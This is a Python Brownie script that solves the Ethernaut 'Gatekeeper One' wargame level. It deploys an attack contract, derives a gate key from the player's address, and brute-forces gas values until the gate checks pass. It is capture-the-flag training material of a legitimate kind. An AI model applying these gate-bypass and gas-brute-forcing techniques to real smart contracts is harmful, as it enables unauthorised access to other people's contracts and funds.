from brownie import web3, network, GatekeeperOne, GatekeeperOneAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "13_gatekeeper_one"
INTERFACE_CONTRACT = GatekeeperOne
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()
    gatekeeperone_attack = GatekeeperOneAttack.deploy(level_contract, {"from": account})
    """
    require(uint32(uint64(_gateKey)) == uint16(tx.origin)
    => says that _gateKey bytes #5,6 must be 00 and #7,8 will be last bytes from tx.origin
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
    => says that _gateKey bytes #5,6 must be 00
    require(uint32(uint64(_gateKey)) != uint64(_gateKey)
    => says that bytes #1-4 must have something filled somewhere
    """
    gateKey = "0x100000000000" + account.address[38:42]
    # testing gateKey
    tx = gatekeeperone_attack.testGateThree(level_contract.address, {"from": account})

    initial_gas = 100000
    """
    # Tried to figure out necessary gas through used gas
    try:
        tx = gatekeeperone_attack.attack(
            gateKey, {"from": account, "gas_limit": initial_gas}
        )
    except:
        print("------ error ------")
    finally:
        print("------ start of try finally ------")
        print(network.history[-1].call_trace(True))
        gas_used = network.history[-1].gas_used
        print("Used gas -> " + str(gas_used))
        print("------ end of try finally ------")
    """
    gate_two_mod = 8191
    i = 7292
    # necessary amount is 7292
    for i in range(7292, gate_two_mod, 1):
        necessary_gas = initial_gas + i
        break_bool = True
        try:
            # does not work on Rinkeby!!!!!!!!!!!!!!!!!!! Also if EIP 1559 / priority_fee is swiched out!!!
            gatekeeperone_attack.attack(
                gateKey,
                {"from": account, "gas_limit": necessary_gas, "allow_revert": True},
            )
            # We found gas amount what works
            break
        except:
            continue
    # print("It was necessary to add this amount of gas ->" + str(i))


# brownie run scripts/_13_gatekeeper_one.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
